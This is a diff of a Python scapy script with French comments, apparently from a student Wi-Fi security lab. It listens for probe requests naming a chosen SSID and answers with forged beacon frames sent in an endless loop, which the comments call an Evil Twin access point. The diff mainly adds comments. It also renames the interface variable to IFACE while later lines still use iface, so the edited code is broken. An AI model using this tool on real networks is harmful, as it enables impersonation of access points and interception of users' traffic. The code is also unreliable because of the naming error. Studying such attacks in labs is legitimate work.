@@ -1,16 +1,18 @@
+# Auteurs : Peguiron Adrien, Viotti Nicolas
+
 from scapy.all import *
 from threading import Thread
 import pandas
 import time
 import os
 
-iface = "wlan0"
+IFACE = "wlan0" # Interface à utiliser
 SSID = input("Entrez le SSID recherché\n")
 
 def callback(packet):
     if packet.haslayer(Dot11ProbeReq):
-        foundSSID = packet.info.decode()
-        if (foundSSID == SSID):
+        foundSSID = packet.info.decode() # Récupère le SSID cherché par la probe request
+        if (foundSSID == SSID): # Si le SSID de la probe request correspond au SSID entré par l'user, on créé alors un Evil Twin
             dot11 = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff',
                           addr2='22:22:22:22:22:22', addr3='33:33:33:33:33:33')
             beacon = Dot11Beacon(cap='ESS+privacy')
@@ -27,10 +29,10 @@ def callback(packet):
 
             frame = RadioTap() / dot11 / beacon / essid / rsn
 
-            # envoie des trames
+            # Envoi des trames
             sendp(frame, iface=iface, inter=0.100, loop=1)
 
 if __name__ == "__main__":
 
-
+    # Démarre le sniffing
     sniff(prn=callback, iface=iface, timeout=20)
